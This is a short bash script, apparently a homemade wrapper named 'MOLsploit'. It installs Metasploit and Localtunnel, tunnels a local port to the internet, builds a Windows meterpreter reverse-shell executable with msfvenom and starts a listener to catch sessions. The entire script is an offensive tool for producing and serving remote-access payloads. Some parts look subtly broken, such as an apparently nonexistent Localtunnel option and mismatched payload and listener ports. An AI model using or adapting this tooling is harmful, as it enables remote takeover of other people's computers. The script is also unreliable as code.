#!/bin/bash
echo "
    __  _______  __               __      _ __     
   /  |/  / __ \/ /   _________  / /___  (_) /_    
  / /|_/ / / / / /   / ___/ __ \/ / __ \/ / __/    
 / /  / / /_/ / /___(__  ) /_/ / / /_/ / / /_      
/_/  /_/\____/_____/____/ .___/_/\____/_/\__/      
                       /_/                         "
# Check if Metasploit is installed
if ! command -v msfconsole &> /dev/null
then
    echo "Metasploit is not installed. Do you want to install it? (y/n)"
    read install_msf
    if [ "$install_msf" = "y" ]
    then
        sudo apt-get update
        sudo apt-get install metasploit-framework
    else
        echo "Metasploit is required to continue. Exiting."
        exit
    fi
fi

# Check if Localtunnel is installed
if ! command -v lt &> /dev/null
then
    echo "Localtunnel is not installed. Do you want to install it? (y/n)"
    read install_lt
    if [ "$install_lt" = "y" ]
    then
        sudo npm install -g localtunnel
    else
        echo "Localtunnel is required to continue. Exiting."
        exit
    fi
fi

# Prompt user for requirements
echo "Enter the payload type (e.g. windows/meterpreter/reverse_https):"
read payload_type
echo "Enter the Localtunnel port (e.g. 9999):"
read lt_port
echo "Enter the Metasploit listener port (e.g. 4444):"
read msf_port

# Start Localtunnel
lt --port $lt_port &

# Create payload
msfvenom -p $payload_type LHOST=$(lt --print-addr $lt_port) LPORT=$lt_port -f exe > payload.exe

# Start Metasploit listener
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload_type; set LHOST 0.0.0.0; set LPORT $msf_port; set ExitOnSession false; exploit -j"
